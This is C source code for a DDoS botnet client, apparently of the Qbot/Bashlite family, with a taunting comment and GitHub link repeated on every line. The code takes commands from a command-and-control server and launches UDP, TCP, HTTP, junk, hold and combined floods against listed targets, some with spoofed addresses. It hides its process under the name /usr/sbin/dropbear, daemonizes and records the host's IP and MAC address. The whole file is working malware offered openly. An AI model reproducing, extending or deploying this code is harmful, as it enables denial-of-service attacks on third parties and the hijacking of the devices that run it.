 // stop stealing ma code skidz -> https://github.com/riu-developer-owounsigned char *ip = argv[1]; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int port = atoi(argv[2]); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int time = atoi(argv[3]); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(strstr(ip, ",") != NULL) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
unsigned char *hi = strtok(ip, ","); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
while(hi != NULL) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(!listFork()) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sendJUNK(hi, port, time); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
close(mainCommSock); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
_exit(0); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
hi = strtok(NULL, ","); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} else { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if (listFork()) { return; } // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owosendJUNK(ip, port, time); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
_exit(0); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(!strcmp(argv[0], "UDP")) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1)) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
//sockprintf(mainCommSock, "UDP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <packet size (1 to 65500)> (time poll interval, default 10)"); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owounsigned char *ip = argv[1]; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int port = atoi(argv[2]); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int time = atoi(argv[3]); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int spoofed = atoi(argv[4]); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int packetsize = atoi(argv[5]); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int pollinterval = (argc == 7 ? atoi(argv[6]) : 10); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(strstr(ip, ",") != NULL) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
unsigned char *hi = strtok(ip, ","); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
while(hi != NULL) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(!listFork()) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sendUDP(hi, port, time, spoofed, packetsize, pollinterval); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
_exit(0); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
hi = strtok(NULL, ","); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} else { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if (listFork()) { return; } // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owosendUDP(ip, port, time, spoofed, packetsize, pollinterval); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
_exit(0); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(!strcmp(argv[0], "HTTP")) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(argc < 3 || atoi(argv[2]) < 1) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owounsigned char *ip = argv[1]; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int time = atoi(argv[2]); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(strstr(ip, ",") != NULL) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
unsigned char *hi = strtok(ip, ","); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
while(hi != NULL) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(!listFork()) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int i = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
while(i < 10){ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sendHTTP(ip, time); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
i++; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
close(mainCommSock); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
_exit(0); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
hi = strtok(NULL, ","); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} else { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if (listFork()) { return; } // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int i = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
while(i < 10){ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sendHTTP(ip, time); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
i++; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
close(mainCommSock); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owo_exit(0); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(!strcmp(argv[0], "CNC")) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-oworeturn; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owounsigned char *ip = argv[1]; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int port = atoi(argv[2]); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int time = atoi(argv[3]); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(strstr(ip, ",") != NULL) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
unsigned char *hi = strtok(ip, ","); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
while(hi != NULL) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(!listFork()) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sendCNC(hi, port, time); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
close(mainCommSock); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
_exit(0); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
hi = strtok(NULL, ","); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} else { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if (listFork()) { return; } // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owosendCNC(ip, port, time); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
_exit(0); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(!strcmp(argv[0], "COMBO")) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-oworeturn; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owounsigned char *ip = argv[1]; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int port = atoi(argv[2]); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int time = atoi(argv[3]); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(strstr(ip, ",") != NULL) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
unsigned char *hi = strtok(ip, ","); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
while(hi != NULL) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(!listFork()) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sendJUNK(hi, port, time); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sendHOLD(hi, port, time); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
close(mainCommSock); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
_exit(0); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
hi = strtok(NULL, ","); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} else { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if (listFork()) { return; } // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owosendJUNK(ip, port, time); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sendHOLD(ip, port, time); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
_exit(0); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(!strcmp(argv[0], "TCP")) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 32 || (argc > 6 && atoi(argv[6]) < 0) || (argc == 8 && atoi(argv[7]) < 1)) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
//sockprintf(mainCommSock, "TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)"); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owounsigned char *ip = argv[1]; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int port = atoi(argv[2]); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int time = atoi(argv[3]); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int spoofed = atoi(argv[4]); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
unsigned char *flags = argv[5]; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoint pollinterval = argc == 8 ? atoi(argv[7]) : 10; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int psize = argc > 6 ? atoi(argv[6]) : 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(strstr(ip, ",") != NULL) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
unsigned char *hi = strtok(ip, ","); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
while(hi != NULL) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(!listFork()) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sendTCP(hi, port, time, spoofed, flags, psize, pollinterval); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
_exit(0); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
hi = strtok(NULL, ","); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} else { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if (listFork()) { return; } // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owosendTCP(ip, port, time, spoofed, flags, psize, pollinterval); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
_exit(0); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(!strcmp(argv[0], "KILLATTK")) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int killed = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
unsigned long i; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
for (i = 0; i < numpids; i++) { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if (pids[i] != 0 && pids[i] != getpid()) { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
kill(pids[i], 9); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
killed++; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(!strcmp(argv[0], "FUCKOFF")) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
exit(0); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owo} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoint initConnection() // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
unsigned char server[4096]; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
memset(server, 0, 4096); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(mainCommSock) { close(mainCommSock); mainCommSock = 0; } //if da sock initialized then close dat // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(currentServer + 1 == SERVER_LIST_SIZE) currentServer = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
else currentServer++; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owostrcpy(server, commServer[currentServer]); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int port = 443; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(strchr(server, ':') != NULL) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
port = atoi(strchr(server, ':') + 1); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
*((unsigned char *)(strchr(server, ':'))) = 0x0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owomainCommSock = socket(AF_INET, SOCK_STREAM, 0); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(!connectTimeout(mainCommSock, server, port, 30)) return 1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-oworeturn 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoint getOurIP() // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int sock = socket(AF_INET, SOCK_DGRAM, 0); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(sock == -1) return 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owostruct sockaddr_in serv; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
memset(&serv, 0, sizeof(serv)); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
serv.sin_family = AF_INET; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
serv.sin_addr.s_addr = inet_addr("8.8.8.8"); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
serv.sin_port = htons(53); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoint err = connect(sock, (const struct sockaddr*) &serv, sizeof(serv)); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(err == -1) return 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owostruct sockaddr_in name; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
socklen_t namelen = sizeof(name); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
err = getsockname(sock, (struct sockaddr*) &name, &namelen); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(err == -1) return 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoourIP.s_addr = name.sin_addr.s_addr; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoint cmdline = open("/proc/net/route", O_RDONLY); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
char linebuf[4096]; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
while(fdgets(linebuf, 4096, cmdline) != NULL) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(strstr(linebuf, "\t00000000\t") != NULL) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
unsigned char *pos = linebuf; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
while(*pos != '\t') pos++; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
*pos = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
break; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
memset(linebuf, 0, 4096); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
close(cmdline); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(*linebuf) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int i; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
struct ifreq ifr; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
strcpy(ifr.ifr_name, linebuf); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
ioctl(sock, SIOCGIFHWADDR, &ifr); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
for (i=0; i<6; i++) macAddress[i] = ((unsigned char*)ifr.ifr_hwaddr.sa_data)[i]; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoclose(sock); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owochar *getBuild() // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
#ifdef MIPS_BUILD // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return "MIPS"; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
#elif MIPSEL_BUILD // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return "MIPSEL"; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
#elif X86_BUILD // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return "X86"; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
#elif ARM_BUILD // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return "ARM"; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
#elif PPC_BUILD // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return "PPC"; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
#else // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return "DONGS"; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
#endif // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoint main(int argc, unsigned char *argv[]) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
char *mynameis = "/usr/sbin/dropbear"; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(SERVER_LIST_SIZE <= 0) return 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
printf("BUILD %s\n", getBuild()); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
strncpy(argv[0],"",strlen(argv[0])); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
argv[0] = "/usr/sbin/dropbear"; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
prctl(PR_SET_NAME, (unsigned long) mynameis, 0, 0, 0); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
srand(time(NULL) ^ getpid()); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
init_rand(time(NULL) ^ getpid()); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
pid_t pid1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
pid_t pid2; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int status; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owogetOurIP(); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif (pid1 = fork()) { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
waitpid(pid1, &status, 0); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
exit(0); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} else if (!pid1) { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if (pid2 = fork()) { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
exit(0); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} else if (!pid2) { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} else { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
//zprintf("fork failed\n"); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} else { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
//zprintf("fork failed\n"); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owosetsid(); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
chdir("/"); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owosignal(SIGPIPE, SIG_IGN); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owowhile(1) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(initConnection()) { sleep(5); continue; } // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owosockprintf(mainCommSock, "BUILD %s", getBuild()); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owochar commBuf[4096]; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int got = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int i = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
while((got = recvLine(mainCommSock, commBuf, 4096)) != -1) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
for (i = 0; i < numpids; i++) if (waitpid(pids[i], NULL, WNOHANG) > 0) { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
unsigned int *newpids, on; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
for (on = i + 1; on < numpids; on++) pids[on-1] = pids[on]; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
pids[on - 1] = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
numpids--; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
newpids = (unsigned int*)malloc((numpids + 1) * sizeof(unsigned int)); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
for (on = 0; on < numpids; on++) newpids[on] = pids[on]; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
free(pids); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
pids = newpids; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owocommBuf[got] = 0x00; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owotrim(commBuf); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(strstr(commBuf, "PING") == commBuf) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sockprintf(mainCommSock, "PONG"); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
continue; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(strstr(commBuf, "DUP") == commBuf) exit(0); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owounsigned char *message = commBuf; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(*message == '!') // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
